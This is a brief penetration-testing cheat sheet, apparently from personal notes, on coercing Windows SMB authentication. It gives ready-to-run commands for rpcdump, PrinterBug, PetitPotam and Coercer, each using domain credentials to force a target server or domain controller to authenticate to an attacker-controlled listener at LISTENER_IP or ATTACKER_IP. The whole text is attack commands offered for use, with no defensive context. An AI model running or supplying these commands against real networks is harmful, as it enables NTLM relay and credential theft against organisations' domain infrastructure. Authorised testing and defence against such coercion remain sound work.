# Coerce SMB 

## Tools: PetitPotam , rpcdump , coercer , printerbug

### Commands:

#### 1) PrinterBug

 - rpcdump.py DOMAIN/USER:PASSWORD@DOMAIN_SERVER | grep MS-RPRN

 - printerbug.py 'DOMAIN/USERNAME:PASSWORD'PRINTER_IP LISTENER_IP

#### 2) PetitPotam

 - PetitPotam.py -d DOMAIN -u USER -p PASSWORD LISTENER_IP TARGET_IP

#### 3) Coercer

 - coercer.py -u USER -d DOMAIN -p PASSWORD -t TARGET -l ATTACKER_IP
